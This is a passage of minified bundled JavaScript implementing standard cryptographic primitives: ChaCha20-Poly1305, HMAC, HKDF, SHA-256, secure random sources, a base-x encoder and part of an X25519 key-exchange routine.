teUint32LE(C+u|0,e,28),Xn.writeUint32LE(I+h|0,e,32),Xn.writeUint32LE(k+d|0,e,36),Xn.writeUint32LE(N+f|0,e,40),Xn.writeUint32LE(R+p|0,e,44),Xn.writeUint32LE(T+g|0,e,48),Xn.writeUint32LE(O+m|0,e,52),Xn.writeUint32LE(P+v|0,e,56),Xn.writeUint32LE(M+y|0,e,60)}function M9(e,t,r,n,i){if(void 0===i&&(i=0),32!==e.length)throw new Error("ChaCha: key size must be 32 bytes");if(n.length<r.length)throw new Error("ChaCha: destination is shorter than source");var o,s;if(0===i){if(8!==t.length&&12!==t.length)throw new Error("ChaCha nonce must be 8 or 12 bytes");s=(o=new Uint8Array(16)).length-t.length,o.set(t,s)}else{if(16!==t.length)throw new Error("ChaCha nonce with counter must be 16 bytes");o=t,s=i}for(var a=new Uint8Array(64),c=0;c<r.length;c+=64){pz(a,o,e);for(var l=c;l<c+64&&l<r.length;l++)n[l]=r[l]^a[l-c];vz(o,0,s)}return m2.wipe(a),0===i&&m2.wipe(o),n}function gz(e,t,r,n){return void 0===n&&(n=0),m2.wipe(r),M9(e,t,r,r,n)}function vz(e,t,r){for(var n=1;r--;)n=n+(255&e[t])|0,e[t]=255&n,n>>>=8,t++;if(n>0)throw new Error("ChaCha: counter overflow")}Rv.streamXOR=M9,Rv.stream=gz;var k9={},Gc={};function mz(e,t,r){return~(e-1)&t|e-1&r}function bz(e,t){return(0|e)-(0|t)-1>>>31&1}function D9(e,t){if(e.length!==t.length)return 0;for(var r=0,n=0;n<e.length;n++)r|=e[n]^t[n];return 1&r-1>>>8}function wz(e,t){return 0!==e.length&&0!==t.length&&0!==D9(e,t)}Object.defineProperty(Gc,"__esModule",{value:!0}),Gc.select=mz,Gc.lessOrEqual=bz,Gc.compare=D9,Gc.equal=wz,function(e){Object.defineProperty(e,"__esModule",{value:!0});var t=Gc,r=fs;e.DIGEST_LENGTH=16;var n=function(){function t(t){this.digestLength=e.DIGEST_LENGTH,this._buffer=new Uint8Array(16),this._r=new Uint16Array(10),this._h=new Uint16Array(10),this._pad=new Uint16Array(8),this._leftover=0,this._fin=0,this._finished=!1;var r=t[0]|t[1]<<8;this._r[0]=8191&r;var n=t[2]|t[3]<<8;this._r[1]=8191&(r>>>13|n<<3);var i=t[4]|t[5]<<8;this._r[2]=7939&(n>>>10|i<<6);var o=t[6]|t[7]<<8;this._r[3]=8191&(i>>>7|o<<9);var s=t[8]|t[9]<<8;this._r[4]=255&(o>>>4|s<<12),this._r[5]=s>>>1&8190;var a=t[10]|t[11]<<8;this._r[6]=8191&(s>>>14|a<<2);var c=t[12]|t[13]<<8;this._r[7]=8065&(a>>>11|c<<5);var l=t[14]|t[15]<<8;this._r[8]=8191&(c>>>8|l<<8),this._r[9]=l>>>5&127,this._pad[0]=t[16]|t[17]<<8,this._pad[1]=t[18]|t[19]<<8,this._pad[2]=t[20]|t[21]<<8,this._pad[3]=t[22]|t[23]<<8,this._pad[4]=t[24]|t[25]<<8,this._pad[5]=t[26]|t[27]<<8,this._pad[6]=t[28]|t[29]<<8,this._pad[7]=t[30]|t[31]<<8}return t.prototype._blocks=function(e,t,r){for(var n=this._fin?0:2048,i=this._h[0],o=this._h[1],s=this._h[2],a=this._h[3],c=this._h[4],l=this._h[5],u=this._h[6],h=this._h[7],d=this._h[8],f=this._h[9],p=this._r[0],g=this._r[1],m=this._r[2],v=this._r[3],y=this._r[4],b=this._r[5],w=this._r[6],_=this._r[7],E=this._r[8],x=this._r[9];r>=16;){var S=e[t+0]|e[t+1]<<8;i+=8191&S;var A=e[t+2]|e[t+3]<<8;o+=8191&(S>>>13|A<<3);var C=e[t+4]|e[t+5]<<8;s+=8191&(A>>>10|C<<6);var I=e[t+6]|e[t+7]<<8;a+=8191&(C>>>7|I<<9);var k=e[t+8]|e[t+9]<<8;c+=8191&(I>>>4|k<<12),l+=k>>>1&8191;var N=e[t+10]|e[t+11]<<8;u+=8191&(k>>>14|N<<2);var R=e[t+12]|e[t+13]<<8;h+=8191&(N>>>11|R<<5);var T=e[t+14]|e[t+15]<<8,O=0,P=O;P+=i*p,P+=o*(5*x),P+=s*(5*E),P+=a*(5*_),O=(P+=c*(5*w))>>>13,P&=8191,P+=l*(5*b),P+=u*(5*y),P+=h*(5*v),P+=(d+=8191&(R>>>8|T<<8))*(5*m);var M=O+=(P+=(f+=T>>>5|n)*(5*g))>>>13;M+=i*g,M+=o*p,M+=s*(5*x),M+=a*(5*E),O=(M+=c*(5*_))>>>13,M&=8191,M+=l*(5*w),M+=u*(5*b),M+=h*(5*y),M+=d*(5*v),O+=(M+=f*(5*m))>>>13,M&=8191;var j=O;j+=i*m,j+=o*g,j+=s*p,j+=a*(5*x),O=(j+=c*(5*E))>>>13,j&=8191,j+=l*(5*_),j+=u*(5*w),j+=h*(5*b),j+=d*(5*y);var L=O+=(j+=f*(5*v))>>>13;L+=i*v,L+=o*m,L+=s*g,L+=a*p,O=(L+=c*(5*x))>>>13,L&=8191,L+=l*(5*E),L+=u*(5*_),L+=h*(5*w),L+=d*(5*b);var D=O+=(L+=f*(5*y))>>>13;D+=i*y,D+=o*v,D+=s*m,D+=a*g,O=(D+=c*p)>>>13,D&=8191,D+=l*(5*x),D+=u*(5*E),D+=h*(5*_),D+=d*(5*w);var B=O+=(D+=f*(5*b))>>>13;B+=i*b,B+=o*y,B+=s*v,B+=a*m,O=(B+=c*g)>>>13,B&=8191,B+=l*p,B+=u*(5*x),B+=h*(5*E),B+=d*(5*_);var U=O+=(B+=f*(5*w))>>>13;U+=i*w,U+=o*b,U+=s*y,U+=a*v,O=(U+=c*m)>>>13,U&=8191,U+=l*g,U+=u*p,U+=h*(5*x),U+=d*(5*E);var $=O+=(U+=f*(5*_))>>>13;$+=i*_,$+=o*w,$+=s*b,$+=a*y,O=($+=c*v)>>>13,$&=8191,$+=l*m,$+=u*g,$+=h*p,$+=d*(5*x);var z=O+=($+=f*(5*E))>>>13;z+=i*E,z+=o*_,z+=s*w,z+=a*b,O=(z+=c*y)>>>13,z&=8191,z+=l*v,z+=u*m,z+=h*g,z+=d*p;var F=O+=(z+=f*(5*x))>>>13;F+=i*x,F+=o*E,F+=s*_,F+=a*w,O=(F+=c*b)>>>13,F&=8191,F+=l*y,F+=u*v,F+=h*m,F+=d*g,i=P=8191&(O=(O=((O+=(F+=f*p)>>>13)<<2)+O|0)+(P&=8191)|0),o=M+=O>>>=13,s=j&=8191,a=L&=8191,c=D&=8191,l=B&=8191,u=U&=8191,h=$&=8191,d=z&=8191,f=F&=8191,t+=16,r-=16}this._h[0]=i,this._h[1]=o,this._h[2]=s,this._h[3]=a,this._h[4]=c,this._h[5]=l,this._h[6]=u,this._h[7]=h,this._h[8]=d,this._h[9]=f},t.prototype.finish=function(e,t){void 0===t&&(t=0);var r,n,i,o,s=new Uint16Array(10);if(this._leftover){for(o=this._leftover,this._buffer[o++]=1;o<16;o++)this._buffer[o]=0;this._fin=1,this._blocks(this._buffer,0,16)}for(r=this._h[1]>>>13,this._h[1]&=8191,o=2;o<10;o++)this._h[o]+=r,r=this._h[o]>>>13,this._h[o]&=8191;for(this._h[0]+=5*r,r=this._h[0]>>>13,this._h[0]&=8191,this._h[1]+=r,r=this._h[1]>>>13,this._h[1]&=8191,this._h[2]+=r,s[0]=this._h[0]+5,r=s[0]>>>13,s[0]&=8191,o=1;o<10;o++)s[o]=this._h[o]+r,r=s[o]>>>13,s[o]&=8191;for(s[9]-=8192,n=(1^r)-1,o=0;o<10;o++)s[o]&=n;for(n=~n,o=0;o<10;o++)this._h[o]=this._h[o]&n|s[o];for(this._h[0]=65535&(this._h[0]|this._h[1]<<13),this._h[1]=65535&(this._h[1]>>>3|this._h[2]<<10),this._h[2]=65535&(this._h[2]>>>6|this._h[3]<<7),this._h[3]=65535&(this._h[3]>>>9|this._h[4]<<4),this._h[4]=65535&(this._h[4]>>>12|this._h[5]<<1|this._h[6]<<14),this._h[5]=65535&(this._h[6]>>>2|this._h[7]<<11),this._h[6]=65535&(this._h[7]>>>5|this._h[8]<<8),this._h[7]=65535&(this._h[8]>>>8|this._h[9]<<5),i=this._h[0]+this._pad[0],this._h[0]=65535&i,o=1;o<8;o++)i=(this._h[o]+this._pad[o]|0)+(i>>>16)|0,this._h[o]=65535&i;return e[t+0]=this._h[0]>>>0,e[t+1]=this._h[0]>>>8,e[t+2]=this._h[1]>>>0,e[t+3]=this._h[1]>>>8,e[t+4]=this._h[2]>>>0,e[t+5]=this._h[2]>>>8,e[t+6]=this._h[3]>>>0,e[t+7]=this._h[3]>>>8,e[t+8]=this._h[4]>>>0,e[t+9]=this._h[4]>>>8,e[t+10]=this._h[5]>>>0,e[t+11]=this._h[5]>>>8,e[t+12]=this._h[6]>>>0,e[t+13]=this._h[6]>>>8,e[t+14]=this._h[7]>>>0,e[t+15]=this._h[7]>>>8,this._finished=!0,this},t.prototype.update=function(e){var t,r=0,n=e.length;if(this._leftover){(t=16-this._leftover)>n&&(t=n);for(var i=0;i<t;i++)this._buffer[this._leftover+i]=e[r+i];if(n-=t,r+=t,this._leftover+=t,this._leftover<16)return this;this._blocks(this._buffer,0,16),this._leftover=0}if(n>=16&&(t=n-n%16,this._blocks(e,r,t),r+=t,n-=t),n){for(i=0;i<n;i++)this._buffer[this._leftover+i]=e[r+i];this._leftover+=n}return this},t.prototype.digest=function(){if(this._finished)throw new Error("Poly1305 was finished");var e=new Uint8Array(16);return this.finish(e),e},t.prototype.clean=function(){return r.wipe(this._buffer),r.wipe(this._r),r.wipe(this._h),r.wipe(this._pad),this._leftover=0,this._fin=0,this._finished=!0,this},t}();e.Poly1305=n,e.oneTimeAuth=function(e,t){var r=new n(e);r.update(t);var i=r.digest();return r.clean(),i},e.equal=function(r,n){return r.length===e.DIGEST_LENGTH&&n.length===e.DIGEST_LENGTH&&t.equal(r,n)}}(k9),function(e){Object.defineProperty(e,"__esModule",{value:!0});var t=Rv,r=k9,n=fs,i=Dt,o=Gc;e.KEY_LENGTH=32,e.NONCE_LENGTH=12,e.TAG_LENGTH=16;var s=new Uint8Array(16),a=function(){function a(t){if(this.nonceLength=e.NONCE_LENGTH,this.tagLength=e.TAG_LENGTH,t.length!==e.KEY_LENGTH)throw new Error("ChaCha20Poly1305 needs 32-byte key");this._key=new Uint8Array(t)}return a.prototype.seal=function(e,r,i,o){if(e.length>16)throw new Error("ChaCha20Poly1305: incorrect nonce length");var s=new Uint8Array(16);s.set(e,s.length-e.length);var a=new Uint8Array(32);t.stream(this._key,s,a,4);var c,l=r.length+this.tagLength;if(o){if(o.length!==l)throw new Error("ChaCha20Poly1305: incorrect destination length");c=o}else c=new Uint8Array(l);return t.streamXOR(this._key,s,r,c,4),this._authenticate(c.subarray(c.length-this.tagLength,c.length),a,c.subarray(0,c.length-this.tagLength),i),n.wipe(s),c},a.prototype.open=function(e,r,i,s){if(e.length>16)throw new Error("ChaCha20Poly1305: incorrect nonce length");if(r.length<this.tagLength)return null;var a=new Uint8Array(16);a.set(e,a.length-e.length);var c=new Uint8Array(32);t.stream(this._key,a,c,4);var l=new Uint8Array(this.tagLength);if(this._authenticate(l,c,r.subarray(0,r.length-this.tagLength),i),!o.equal(l,r.subarray(r.length-this.tagLength,r.length)))return null;var u,h=r.length-this.tagLength;if(s){if(s.length!==h)throw new Error("ChaCha20Poly1305: incorrect destination length");u=s}else u=new Uint8Array(h);return t.streamXOR(this._key,a,r.subarray(0,r.length-this.tagLength),u,4),n.wipe(a),u},a.prototype.clean=function(){return n.wipe(this._key),this},a.prototype._authenticate=function(e,t,o,a){var c=new r.Poly1305(t);a&&(c.update(a),a.length%16>0&&c.update(s.subarray(a.length%16))),c.update(o),o.length%16>0&&c.update(s.subarray(o.length%16));var l=new Uint8Array(8);a&&i.writeUint64LE(a.length,l),c.update(l),i.writeUint64LE(o.length,l),c.update(l);for(var u=c.digest(),h=0;h<u.length;h++)e[h]=u[h];c.clean(),n.wipe(u),n.wipe(l)},a}();e.ChaCha20Poly1305=a}(W3);var $9={},T0={},z3={};function yz(e){return typeof e.saveState<"u"&&typeof e.restoreState<"u"&&typeof e.cleanSavedState<"u"}Object.defineProperty(z3,"__esModule",{value:!0}),z3.isSerializableHash=yz,Object.defineProperty(T0,"__esModule",{value:!0});var To=z3,_z=Gc,Ez=fs,L9=function(){function e(e,t){this._finished=!1,this._inner=new e,this._outer=new e,this.blockSize=this._outer.blockSize,this.digestLength=this._outer.digestLength;var r=new Uint8Array(this.blockSize);t.length>this.blockSize?this._inner.update(t).finish(r).clean():r.set(t);for(var n=0;n<r.length;n++)r[n]^=54;this._inner.update(r);for(n=0;n<r.length;n++)r[n]^=106;this._outer.update(r),To.isSerializableHash(this._inner)&&To.isSerializableHash(this._outer)&&(this._innerKeyedState=this._inner.saveState(),this._outerKeyedState=this._outer.saveState()),Ez.wipe(r)}return e.prototype.reset=function(){if(!To.isSerializableHash(this._inner)||!To.isSerializableHash(this._outer))throw new Error("hmac: can't reset() because hash doesn't implement restoreState()");return this._inner.restoreState(this._innerKeyedState),this._outer.restoreState(this._outerKeyedState),this._finished=!1,this},e.prototype.clean=function(){To.isSerializableHash(this._inner)&&this._inner.cleanSavedState(this._innerKeyedState),To.isSerializableHash(this._outer)&&this._outer.cleanSavedState(this._outerKeyedState),this._inner.clean(),this._outer.clean()},e.prototype.update=function(e){return this._inner.update(e),this},e.prototype.finish=function(e){return this._finished?(this._outer.finish(e),this):(this._inner.finish(e),this._outer.update(e.subarray(0,this.digestLength)).finish(e),this._finished=!0,this)},e.prototype.digest=function(){var e=new Uint8Array(this.digestLength);return this.finish(e),e},e.prototype.saveState=function(){if(!To.isSerializableHash(this._inner))throw new Error("hmac: can't saveState() because hash doesn't implement it");return this._inner.saveState()},e.prototype.restoreState=function(e){if(!To.isSerializableHash(this._inner)||!To.isSerializableHash(this._outer))throw new Error("hmac: can't restoreState() because hash doesn't implement it");return this._inner.restoreState(e),this._outer.restoreState(this._outerKeyedState),this._finished=!1,this},e.prototype.cleanSavedState=function(e){if(!To.isSerializableHash(this._inner))throw new Error("hmac: can't cleanSavedState() because hash doesn't implement it");this._inner.cleanSavedState(e)},e}();function xz(e,t,r){var n=new L9(e,t);n.update(r);var i=n.digest();return n.clean(),i}T0.HMAC=L9,T0.hmac=xz,T0.equal=_z.equal,Object.defineProperty($9,"__esModule",{value:!0});var wE=T0,yE=fs,Sz=function(){function e(e,t,r,n){void 0===r&&(r=new Uint8Array(0)),this._counter=new Uint8Array(1),this._hash=e,this._info=n;var i=wE.hmac(this._hash,r,t);this._hmac=new wE.HMAC(e,i),this._buffer=new Uint8Array(this._hmac.digestLength),this._bufpos=this._buffer.length}return e.prototype._fillBuffer=function(){this._counter[0]++;var e=this._counter[0];if(0===e)throw new Error("hkdf: cannot expand more");this._hmac.reset(),e>1&&this._hmac.update(this._buffer),this._info&&this._hmac.update(this._info),this._hmac.update(this._counter),this._hmac.finish(this._buffer),this._bufpos=0},e.prototype.expand=function(e){for(var t=new Uint8Array(e),r=0;r<t.length;r++)this._bufpos===this._buffer.length&&this._fillBuffer(),t[r]=this._buffer[this._bufpos++];return t},e.prototype.clean=function(){this._hmac.clean(),yE.wipe(this._buffer),yE.wipe(this._counter),this._bufpos=0},e}(),Cz=$9.HKDF=Sz,oh={},Tv={},Nv={};Object.defineProperty(Nv,"__esModule",{value:!0}),Nv.BrowserRandomSource=void 0;const _E=65536;class Az{constructor(){this.isAvailable=!1,this.isInstantiated=!1;const e=typeof self<"u"?self.crypto||self.msCrypto:null;e&&void 0!==e.getRandomValues&&(this._crypto=e,this.isAvailable=!0,this.isInstantiated=!0)}randomBytes(e){if(!this.isAvailable||!this._crypto)throw new Error("Browser random byte generator is not available.");const t=new Uint8Array(e);for(let e=0;e<t.length;e+=_E)this._crypto.getRandomValues(t.subarray(e,e+Math.min(t.length-e,_E)));return t}}function Iz(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}Nv.BrowserRandomSource=Az;var Ov={};const Rz={},Tz=Object.freeze(Object.defineProperty({__proto__:null,default:Rz},Symbol.toStringTag,{value:"Module"})),N0=sa(Tz);Object.defineProperty(Ov,"__esModule",{value:!0}),Ov.NodeRandomSource=void 0;const Nz=fs;class Oz{constructor(){if(this.isAvailable=!1,this.isInstantiated=!1,typeof Iz<"u"){const e=N0;e&&e.randomBytes&&(this._crypto=e,this.isAvailable=!0,this.isInstantiated=!0)}}randomBytes(e){if(!this.isAvailable||!this._crypto)throw new Error("Node.js random byte generator is not available.");let t=this._crypto.randomBytes(e);if(t.length!==e)throw new Error("NodeRandomSource: got fewer bytes than requested");const r=new Uint8Array(e);for(let e=0;e<r.length;e++)r[e]=t[e];return(0,Nz.wipe)(t),r}}Ov.NodeRandomSource=Oz,Object.defineProperty(Tv,"__esModule",{value:!0}),Tv.SystemRandomSource=void 0;const Pz=Nv,Mz=Ov;class kz{constructor(){return this.isAvailable=!1,this.name="",this._source=new Pz.BrowserRandomSource,this._source.isAvailable?(this.isAvailable=!0,void(this.name="Browser")):(this._source=new Mz.NodeRandomSource,this._source.isAvailable?(this.isAvailable=!0,void(this.name="Node")):void 0)}randomBytes(e){if(!this.isAvailable)throw new Error("System random byte generator is not available.");return this._source.randomBytes(e)}}Tv.SystemRandomSource=kz,function(e){Object.defineProperty(e,"__esModule",{value:!0}),e.randomStringForEntropy=e.randomString=e.randomUint32=e.randomBytes=e.defaultRandomSource=void 0;const t=Tv,r=Dt,n=fs;function i(t,r=e.defaultRandomSource){return r.randomBytes(t)}e.defaultRandomSource=new t.SystemRandomSource,e.randomBytes=i,e.randomUint32=function(t=e.defaultRandomSource){const o=i(4,t),s=(0,r.readUint32LE)(o);return(0,n.wipe)(o),s};const o="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";function s(t,r=o,s=e.defaultRandomSource){if(r.length<2)throw new Error("randomString charset is too short");if(r.length>256)throw new Error("randomString charset is too long");let a="";const c=r.length,l=256-256%c;for(;t>0;){const e=i(Math.ceil(256*t/l),s);for(let n=0;n<e.length&&t>0;n++){const i=e[n];i<l&&(a+=r.charAt(i%c),t--)}(0,n.wipe)(e)}return a}e.randomString=s,e.randomStringForEntropy=function(t,r=o,n=e.defaultRandomSource){return s(Math.ceil(t/(Math.log(r.length)/Math.LN2)),r,n)}}(oh);var Pv={};!function(e){Object.defineProperty(e,"__esModule",{value:!0});var t=Dt,r=fs;e.DIGEST_LENGTH=32,e.BLOCK_SIZE=64;var n=function(){function n(){this.digestLength=e.DIGEST_LENGTH,this.blockSize=e.BLOCK_SIZE,this._state=new Int32Array(8),this._temp=new Int32Array(64),this._buffer=new Uint8Array(128),this._bufferLength=0,this._bytesHashed=0,this._finished=!1,this.reset()}return n.prototype._initState=function(){this._state[0]=1779033703,this._state[1]=3144134277,this._state[2]=1013904242,this._state[3]=2773480762,this._state[4]=1359893119,this._state[5]=2600822924,this._state[6]=528734635,this._state[7]=1541459225},n.prototype.reset=function(){return this._initState(),this._bufferLength=0,this._bytesHashed=0,this._finished=!1,this},n.prototype.clean=function(){r.wipe(this._buffer),r.wipe(this._temp),this.reset()},n.prototype.update=function(e,t){if(void 0===t&&(t=e.length),this._finished)throw new Error("SHA256: can't update because hash was finished.");var r=0;if(this._bytesHashed+=t,this._bufferLength>0){for(;this._bufferLength<this.blockSize&&t>0;)this._buffer[this._bufferLength++]=e[r++],t--;this._bufferLength===this.blockSize&&(o(this._temp,this._state,this._buffer,0,this.blockSize),this._bufferLength=0)}for(t>=this.blockSize&&(r=o(this._temp,this._state,e,r,t),t%=this.blockSize);t>0;)this._buffer[this._bufferLength++]=e[r++],t--;return this},n.prototype.finish=function(e){if(!this._finished){var r=this._bytesHashed,n=this._bufferLength,i=r/536870912|0,s=r<<3,a=r%64<56?64:128;this._buffer[n]=128;for(var c=n+1;c<a-8;c++)this._buffer[c]=0;t.writeUint32BE(i,this._buffer,a-8),t.writeUint32BE(s,this._buffer,a-4),o(this._temp,this._state,this._buffer,0,a),this._finished=!0}for(c=0;c<this.digestLength/4;c++)t.writeUint32BE(this._state[c],e,4*c);return this},n.prototype.digest=function(){var e=new Uint8Array(this.digestLength);return this.finish(e),e},n.prototype.saveState=function(){if(this._finished)throw new Error("SHA256: cannot save finished state");return{state:new Int32Array(this._state),buffer:this._bufferLength>0?new Uint8Array(this._buffer):void 0,bufferLength:this._bufferLength,bytesHashed:this._bytesHashed}},n.prototype.restoreState=function(e){return this._state.set(e.state),this._bufferLength=e.bufferLength,e.buffer&&this._buffer.set(e.buffer),this._bytesHashed=e.bytesHashed,this._finished=!1,this},n.prototype.cleanSavedState=function(e){r.wipe(e.state),e.buffer&&r.wipe(e.buffer),e.bufferLength=0,e.bytesHashed=0},n}();e.SHA256=n;var i=new Int32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]);function o(e,r,n,o,s){for(;s>=64;){for(var a=r[0],c=r[1],l=r[2],u=r[3],h=r[4],d=r[5],f=r[6],p=r[7],g=0;g<16;g++){var m=o+4*g;e[g]=t.readUint32BE(n,m)}for(g=16;g<64;g++){var v=e[g-2],y=(v>>>17|v<<15)^(v>>>19|v<<13)^v>>>10,b=((v=e[g-15])>>>7|v<<25)^(v>>>18|v<<14)^v>>>3;e[g]=(y+e[g-7]|0)+(b+e[g-16]|0)}for(g=0;g<64;g++){y=(((h>>>6|h<<26)^(h>>>11|h<<21)^(h>>>25|h<<7))+(h&d^~h&f)|0)+(p+(i[g]+e[g]|0)|0)|0,b=((a>>>2|a<<30)^(a>>>13|a<<19)^(a>>>22|a<<10))+(a&c^a&l^c&l)|0;p=f,f=d,d=h,h=u+y|0,u=l,l=c,c=a,a=y+b|0}r[0]+=a,r[1]+=c,r[2]+=l,r[3]+=u,r[4]+=h,r[5]+=d,r[6]+=f,r[7]+=p,o+=64,s-=64}return o}e.hash=function(e){var t=new n;t.update(e);var r=t.digest();return t.clean(),r}}(Pv);var H3={};function q3(e){return null!=globalThis.Buffer?new Uint8Array(e.buffer,e.byteOffset,e.byteLength):e}function B9(e=0){return null!=globalThis.Buffer&&null!=globalThis.Buffer.allocUnsafe?q3(globalThis.Buffer.allocUnsafe(e)):new Uint8Array(e)}function b2(e,t){t||(t=e.reduce(((e,t)=>e+t.length),0));const r=B9(t);let n=0;for(const t of e)r.set(t,n),n+=t.length;return q3(r)}function Dz(e,t){if(e.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<e.length;i++){var o=e.charAt(i),s=o.charCodeAt(0);if(255!==r[s])throw new TypeError(o+" is ambiguous");r[s]=i}var a=e.length,c=e.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(e){if("string"!=typeof e)throw new TypeError("Expected String");if(0===e.length)return new Uint8Array;var t=0;if(" "!==e[t]){for(var n=0,i=0;e[t]===c;)n++,t++;for(var o=(e.length-t)*l+1>>>0,s=new Uint8Array(o);e[t];){var u=r[e.charCodeAt(t)];if(255===u)return;for(var h=0,d=o-1;(0!==u||h<i)&&-1!==d;d--,h++)u+=a*s[d]>>>0,s[d]=u%256>>>0,u=u/256>>>0;if(0!==u)throw new Error("Non-zero carry");i=h,t++}if(" "!==e[t]){for(var f=o-i;f!==o&&0===s[f];)f++;for(var p=new Uint8Array(n+(o-f)),g=n;f!==o;)p[g++]=s[f++];return p}}}return{encode:function(t){if(t instanceof Uint8Array||(ArrayBuffer.isView(t)?t=new Uint8Array(t.buffer,t.byteOffset,t.byteLength):Array.isArray(t)&&(t=Uint8Array.from(t))),!(t instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(0===t.length)return"";for(var r=0,n=0,i=0,o=t.length;i!==o&&0===t[i];)i++,r++;for(var s=(o-i)*u+1>>>0,l=new Uint8Array(s);i!==o;){for(var h=t[i],d=0,f=s-1;(0!==h||d<n)&&-1!==f;f--,d++)h+=256*l[f]>>>0,l[f]=h%a>>>0,h=h/a>>>0;if(0!==h)throw new Error("Non-zero carry");n=d,i++}for(var p=s-n;p!==s&&0===l[p];)p++;for(var g=c.repeat(r);p<s;++p)g+=e.charAt(l[p]);return g},decodeUnsafe:h,decode:function(e){var r=h(e);if(r)return r;throw new Error(`Non-${t} character`)}}}!function(e){Object.defineProperty(e,"__esModule",{value:!0}),e.sharedKey=e.generateKeyPair=e.generateKeyPairFromSeed=e.scalarMultBase=e.scalarMult=e.SHARED_KEY_LENGTH=e.SECRET_KEY_LENGTH=e.PUBLIC_KEY_LENGTH=void 0;const t=oh,r=fs;function n(e){const t=new Float64Array(16);if(e)for(let r=0;r<e.length;r++)t[r]=e[r];return t}e.PUBLIC_KEY_LENGTH=32,e.SECRET_KEY_LENGTH=32,e.SHARED_KEY_LENGTH=32;const i=new Uint8Array(32);i[0]=9;const o=n([56129,1]);function s(e){let t=1;for(let r=0;r<16;r++){let n=e[r]+t+65535;t=Math.floor(n/65536),e[r]=n-65536*t}e[0]+=t-1+37*(t-1)}function a(e,t,r){const n=~(r-1);for(let r=0;r<16;r++){const i=n&(e[r]^t[r]);e[r]^=i,t[r]^=i}}function c(e,t,r){for(let n=0;n<16;n++)e[n]=t[n]+r[n]}function l(e,t,r){for(let n=0;n<16;n++)e[n]=t[n]-r[n]}function u(e,t,r){let n,i,o=0,s=0,a=0,c=0,l=0,u=0,h=0,d=0,f=0,p=0,g=0,m=0,v=0,y=0,b=0,w=0,_=0,E=0,x=0,S=0,A=0,C=0,I=0,k=0,N=0,R=0,T=0,O=0,P=0,M=0,j=0,L=r[0],D=r[1],B=r[2],U=r[3],$=r[4],z=r[5],F=r[6],H=r[7],q=r[8],W=r[9],V=r[10],G=r[11],K=r[12],Z=r[13],Y=r[14],J=r[15];n=t[0],o+=n*L,s+=n*D,a+=n*B,c+=n*U,l+=n*$,u+=n*z,h+=n*F,d+=n*H,f+=n*q,p+=n*W,g+=n*V,m+=n*G,v+=n*K,y+=n*Z,b+=n*Y,w+=n*J,n=t[1],s+=n*L,a+=n*D,c+=n*B,l+=n*U,u+=n*$,h+=n*z,d+=n*F,f+=n*H,p+=n*q,g+=n*W,m+=n*V,v+=n*G,y+=n*K,b+=n*Z,w+=n*Y,_+=n*J,n=t[2],a+=n*L,c+=n*D,l+=n*B,u+=n*U,h+=n*$,d+=n*z,f+=n*F,p+=n*H,g+=n*q,m+=n*W,v+=n*V,y+=n*G,b+=n*K,w+=n*Z,_+=n*Y,E+=n*J,n=t[3],c+=n*L,l+=n*D,u+=n*B,h+=n*U,d+=n*$,f+=n*z,p+=n*F,g+=n*H,m+=n*q,v+=n*W,y+=n*V,b+=n*G,w+=n*K,_+=n*Z,E+=n*Y,x+=n*J,n=t[4],l+=n*L,u+=n*D,h+=n*B,d+=n*U,f+=n*$,p+=n*z,g+=n*F,m+=n*H,v+=n*q,y+=n*W,b+=n*V,w+=n*G,_+=n*K,E+=n*Z,x+=n*Y,S+=n*J,n=t[5],u+=n*L,h+=n*D,d+=n*B,f+=n*U,p+=n*$,g+=n*z,m+=n*F,v+=n*H,y+=n*q,b+=n*W,w+=n*V,_+=n*G,E+=n*K,x+=n*Z,S+=n*Y,A+=n*J,n=t[6],h+=n*L,d+=n*D,f+=n*B,p+=n*U,g+=n*$,m+=n*z,v+=n*F,y+=n*H,b+=n*q,w+=n*W,_+=n*V,E+=n*G,x+=n*K,S+=n*Z,A+=n*Y,C+=n*J,n=t[7],d+=n*L,f+=n*D,p+=n*B,g+=n*U,m+=n*$,v+=n*z,y+=n*F,b+=n*H,w+=n*q,_+=n*W,E+=n*V,x+=n*G,S+=n*K,A+=n*Z,C+=n*Y,I+=n*J,n=t[8],f+=n*L,p+=n*D,g+=n*B,m+=n*U,v+=n*$,y+=n*z,b+=n*F,w+=n*H,_+=n*q,E+=n*W,x+=n*V,S+=n*G,A+=n*K,C+=n*Z,I+=n*Y,k+=n*J,n=t[9],p+=n*L,g+=n*D,m+=n*B,v+=n*U,y+=n*$,b+=n*z,w+=n*F,_+=n*H,E+=n*q,x+=n*W,S+=n*V,A+=n*G,C+=n*K,I+=n*Z,k+=n*Y,N+=n*J,n=t[10],g+=n*L,m+=n*D,v+=n*B,y+=n*U,b+=n*$,w+=n*z,_+=n*F,E+=n*H,x+=n*q,S+=n*W,A+=n*V,C+=n*G,I+=n*K,k+=n*Z,N+=n*Y,R+=n*J,n=t[11],m+=n*L,v+=n*D,y+=n*B,b+=n*U,w+=n*$,_+=n*z,E+=n*F,x+=n*H,S+=n*q,A+=n*W,C+=n*V,I+=n*G,k+=n*K,N+=n*Z,R+=n*Y,T+=n*J,n=t[12],v+=n*L,y+=n*D,b+=n*B,w+=n*U,_+=n*$,E+=n*z,x+=n*F,S+=n*H,A+=n*q,C+=n*W,I+=n*V,k+=n*G,N+=n*K,R+=n*Z,T+=n*Y,O+=n*J,n=t[13],y+=n*L,b+=n*D,w+=n*B,_+=n*U,E+=n*$,x+=n*z,S+=n*F,A+=n*H,C+=n*q,I+=n*W,k+=n*V,N+=n*G,R+=n*K,T+=n*Z,O+=n*Y,P+=n*J,n=t